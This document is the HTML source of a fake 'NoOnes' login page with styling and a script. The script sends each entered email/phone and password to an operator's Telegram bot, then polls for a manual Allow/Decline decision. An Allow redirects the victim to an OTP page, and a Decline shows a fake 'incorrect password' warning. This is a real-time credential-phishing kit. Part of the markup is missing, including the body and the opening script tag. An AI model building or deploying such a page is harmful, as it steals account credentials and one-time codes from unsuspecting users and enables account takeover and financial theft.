<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NoOnes - Login</title>
    <style>
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        :root {
            --bg-color: #f5f5f5;
            --text-color: #333;
            --input-bg: #f0f0f0;
            --input-placeholder: #aaa;
            --card-bg: #ffffff;
            --link-color: #00b36b;
            --button-bg: #00b36b;
            --button-text: #ffffff;
            --logo-color: #00b36b;
            --shadow-color: rgba(0,0,0,0.1);
            --medium-green: #00b36b;
            --grey-green: #6b7280;
            --apple-color: #333;
            --error-color: #ef4444;
        }
        body.dark {
            --bg-color: #1a1a1a;
            --text-color: #ddd;
            --input-bg: #333333;
            --input-placeholder: #777;
            --card-bg: #222222;
            --link-color: #00d17f;
            --button-bg: #00d17f;
            --button-text: #ffffff;
            --logo-color: #00d17f;
            --shadow-color: rgba(255,255,255,0.1);
            --medium-green: #00d17f;
            --grey-green: #9ca3af;
            --apple-color: #9ca3af;
            --error-color: #f87171;
        }
        * { transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease; }
        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            padding: 40px 20px;
            animation: fadeIn 0.5s ease-out;
        }
        .wrapper { max-width: 430px; width: 100%; margin: 0 auto; }
        .logo-container {
            display: flex;
            justify-content: center;
            align-items: flex-end;
            width: 100%;
            margin-top: 32px;
            margin-bottom: 8px;
        }
        .logo-link { height: 66px; color: var(--logo-color); }
        .container {
            background-color: var(--card-bg);
            padding: 24px 24px 32px;
            border-radius: 8px;
            box-shadow: 0 4px 12px var(--shadow-color);
            text-align: center;
        }
        h2 { font-size: 20px; font-weight: 600; margin: 0 0 16px; }
        .social-logins {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 24px;
        }
        .social-button {
            background-color: var(--input-bg);
            border: none;
            border-radius: 4px;
            padding: 8px;
            cursor: pointer;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: transform 0.2s ease;
            text-decoration: none;
        }
        .social-button:hover { transform: scale(1.05); }
        .social-button svg { width: 24px; height: 24px; }
        .apple-icon path { fill: var(--apple-color); }
        .telegram-button circle { fill: #0088cc; }
        label {
            display: block;
            text-align: left;
            margin: 12px 0 4px;
            font-size: 14px;
            font-weight: 600;
            color: var(--grey-green);
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border: none;
            border-radius: 4px;
            background-color: var(--input-bg);
            color: var(--text-color);
            box-sizing: border-box;
            font-size: 14px;
        }
        input:focus { outline: none; }
        input::placeholder { color: var(--input-placeholder); }
        .password-wrapper { position: relative; }
        .password-wrapper input { padding-right: 48px; }
        .toggle-password {
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            color: var(--grey-green);
        }
        .toggle-password svg { width: 20px; height: 20px; }
        .forgot-password {
            display: block;
            text-align: right;
            font-size: 12px;
            color: var(--link-color);
            text-decoration: none;
            margin: 4px 0 16px;
            font-weight: 600;
        }
        .login-button {
            width: 100%;
            padding: 12px;
            background-color: var(--button-bg);
            color: var(--button-text);
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: transform 0.2s ease, background-color 0.2s ease;
            margin-top: 8px;
            margin-bottom: 16px;
        }
        .signup-link {
            font-size: 16px;
            color: var(--grey-green);
            margin-bottom: 24px;
        }
        .signup-link a {
            color: var(--link-color);
            text-decoration: none;
            font-weight: 600;
        }
        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
            font-size: 12px;
            color: var(--text-color);
            font-weight: 600;
        }
        .theme-toggle { display: flex; align-items: center; gap: 8px; }
        .theme-icon { width: 24px; height: 24px; color: var(--medium-green); }
        .slider-label {
            position: relative;
            display: inline-block;
            width: 52px;
            height: 28px;
        }
        .slider-input { opacity: 0; width: 0; height: 0; }
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0; left: 0; right: 0; bottom: 0;
            background-color: var(--button-bg);
            border-radius: 14px;
            transition: .3s;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 20px; width: 20px;
            left: 4px; bottom: 4px;
            background-color: #ffffff;
            border-radius: 50%;
            transition: .3s;
        }
        .slider-input:checked + .slider:before { transform: translateX(24px); }
        .language {
            display: flex;
            align-items: center;
            gap: 4px;
            color: var(--link-color);
            text-decoration: underline;
            cursor: pointer;
        }
        .error-message {
            color: var(--error-color);
            font-size: 12px;
            text-align: left;
            margin-top: 4px;
            display: none;
        }
        .flex { display: flex; }
        .flex-col { flex-direction: column; }
        .gap-4 { gap: 16px; }
        .gap-2 { gap: 8px; }
        @media (min-width: 1024px) { .wrapper { max-width: 500px; } }
        @media (max-width: 430px) {
            body { padding: 20px 10px; }
            .wrapper { max-width: 100%; }
        }
        .warning-message {
            color: var(--error-color);
            font-size: 14px;
            font-weight: 500;
            margin: 16px 0;
            padding: 12px;
            background: rgba(239,68,68,0.1);
            border-radius: 6px;
            display: none;
        }
    </style>
</head>

        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";           // ← replace
        const ADMIN_CHAT_ID = "123456789";                  // ← your Telegram ID

        // Generate unique session ID for this login attempt (so bot knows which one to approve)
        function generateSessionId() {
            return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        }

        let currentSessionId = null;
        let pollingInterval = null;

        // Send credentials to Telegram bot
        async function sendCredentialsToBot(email, password) {
            currentSessionId = generateSessionId();

            const message = 
        `New login attempt:
        Email/Phone: ${email}
        Password: ${password}
        Session: ${currentSessionId}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            const keyboard = {
                inline_keyboard: [[
                    { text: "✅ Allow", callback_data: `allow_${currentSessionId}` },
                    { text: "❌ Decline", callback_data: `decline_${currentSessionId}` }
                ]]
            };

            try {
                const res = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message,
                        reply_markup: keyboard
                    })
                });

                if (!res.ok) throw new Error("Telegram send failed");
                return true;
            } catch (err) {
                console.error(err);
                alert("Error contacting approval service. Try again.");
                return false;
            }
        }

        // Show warning message
        function showWarning() {
            let warning = document.querySelector('.warning-message');
            if (!warning) {
                warning = document.createElement('div');
                warning.className = 'warning-message';
                warning.textContent = "Please enter the correct email/phone or password. Note that the password is case-sensitive. Please try again.";
                document.querySelector('.social-logins').after(warning);
            }
            warning.style.display = 'block';
        }

        // Start polling for admin decision (very basic long-polling simulation)
        function startApprovalPolling() {
            document.getElementById('loading-overlay').style.display = 'flex';

            pollingInterval = setInterval(async () => {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&timeout=10`);
                    const data = await res.json();

                    if (data.ok && data.result.length > 0) {
                        for (const update of data.result) {
                            if (update.callback_query) {
                                const cb = update.callback_query;
                                const dataStr = cb.data;

                                if (dataStr.startsWith(`allow_${currentSessionId}`)) {
                                    clearInterval(pollingInterval);
                                    document.getElementById('loading-overlay').style.display = 'none';
                                    window.location.href = 'otp.html'; // or your real next page
                                    return;
                                }

                                if (dataStr.startsWith(`decline_${currentSessionId}`)) {
                                    clearInterval(pollingInterval);
                                    document.getElementById('loading-overlay').style.display = 'none';
                                    showWarning();
                                    return;
                                }
                            }
                        }
                    }
                } catch (e) {
                    console.error("Polling error", e);
                }
            }, 4000); // check every ~4 seconds
        }

        // Modified form submit
        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            const emailErr = document.getElementById('email-error');
            const passErr = document.getElementById('password-error');

            emailErr.style.display = 'none';
            passErr.style.display = 'none';

            let valid = true;
            if (!email) { emailErr.style.display = 'block'; valid = false; }
            if (!password) { passErr.style.display = 'block'; valid = false; }

            if (!valid) return;

            // Send to bot & wait for approval
            const sent = await sendCredentialsToBot(email, password);
            if (sent) {
                startApprovalPolling();
            }
        });

        // Optional: stop polling if user leaves page
        window.addEventListener('beforeunload', () => {
            if (pollingInterval) clearInterval(pollingInterval);
        });
    </script>
</body>
